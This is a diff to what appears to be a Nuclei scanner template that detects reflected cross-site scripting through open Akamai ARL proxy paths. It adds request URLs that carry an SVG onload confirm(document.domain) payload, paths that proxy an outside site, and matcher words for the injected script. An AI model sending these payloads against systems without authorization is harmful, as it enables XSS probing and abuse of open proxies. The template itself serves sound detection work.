@@ -1,10 +1,11 @@
 http:
 - matchers:
-  - condition: and
+  - condition: or
+    part: body
     type: word
     words:
     - '"><svg onload=confirm(document.domain)>'
-    - Suggestions for improving the results
+    - alert(document.domain);
   - part: header
     type: word
     words:
@@ -13,9 +14,12 @@ http:
   method: GET
   path:
   - '{{BaseURL}}/7/0/33/1d/www.citysearch.com/search?what=x&where=place%22%3E%3Csvg+onload=confirm(document.domain)%3E'
+  - '{{BaseURL}}/f/1/1/1/www.citysearch.com/search?what=x&where=place%22%3E%3Csvg+onload=confirm(document.domain)%3E'
+  - '{{BaseURL}}/7/0/33/1d/http://brutelogic.com.br/2'
+  - '{{BaseURL}}/f/1/1/1/http://brutelogic.com.br/2'
 id: akamai-arl-xss
 info:
-  author: pdteam
+  author: pdteam,reewardius
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
     cvss-score: 7.2
@@ -24,7 +28,7 @@ info:
     can execute arbitrary script in the browser of an unsuspecting user in the context
     of the affected site.
   metadata:
-    max-request: 1
+    max-request: 4
   name: Open Akamai ARL - Cross-Site Scripting
   reference:
   - https://github.com/war-and-code/akamai-arl-hack
@@ -33,4 +37,4 @@ info:
   - https://github.com/cybercdh/goarl
   - https://community.akamai.com/customers/s/article/WebPerformanceV1V2ARLChangeStartingFebruary282021?language=en_US
   severity: high
-  tags: akamai,xss,misconfig
+  tags: xss,akamai
